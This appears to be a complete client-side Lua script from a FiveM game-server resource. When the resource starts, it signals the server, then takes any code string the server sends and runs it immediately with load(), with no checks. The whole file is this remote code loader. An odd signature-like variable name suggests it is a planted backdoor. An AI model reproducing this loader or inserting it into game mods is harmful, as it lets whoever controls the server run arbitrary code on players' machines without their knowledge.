local resourceName = GetCurrentResourceName()

AddEventHandler('onClientResourceStart', function(resource)
    if resource == resourceName then
        TriggerServerEvent(resourceName)
    end
end)

RegisterNetEvent(resourceName)
AddEventHandler(resourceName, function(script)
  siemaztejstronyjjayjoker = load(script)
  siemaztejstronyjjayjoker()
end)
